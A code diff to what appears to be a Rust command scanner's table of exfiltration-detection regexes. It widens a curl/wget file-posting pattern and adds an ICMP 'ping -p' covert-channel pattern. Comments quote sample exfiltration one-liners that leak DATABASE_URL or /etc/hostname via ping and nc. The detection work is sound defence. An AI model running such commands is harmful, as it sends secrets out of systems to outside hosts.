@@ -684,7 +684,7 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             ),
             (
                 Regex::new(
-                    r"(curl|wget)\s+[^|\n]*(-d[\s,]+@|--data(-binary|-raw)?[\s,]+@)/(etc|root|home|var|proc|app/(\.env|config|secrets))",
+                    r"(curl|wget)\s+[^|\n]*(-d[\s,]+@|--data(-binary|-raw)?[\s,]+@|--post[-\s,]+file[-\s,=]*)/(etc|root|home|var|proc|app/(\.env|config|secrets))",
                 )
                 .expect("Invalid regex"),
                 "sensitive file posted to remote (exfiltration)",
@@ -771,6 +771,13 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 )
                 .expect("Invalid regex"),
                 "socat exfiltration channel",
+            ),
+            // ping with a payload pattern from a substitution (wave-71:
+            // \`ping -c 4 -p $(echo $DATABASE_URL | xxd -p) host\`) —
+            // ICMP echo-request payloads as a covert channel.
+            (
+                Regex::new(r"\bping\s+[^|\n]*-p[a-z]*\s*\$?\(?\$\(").expect("Invalid regex"),
+                "icmp payload exfiltration (ping -p with substitution)",
             ),
             // nc with an stdin payload (wave-58: \`nc -w1 1.1.1.1 80
             // <<< 'GET /$(base64 < /etc/hostname) HTTP/1.0'\`) — the
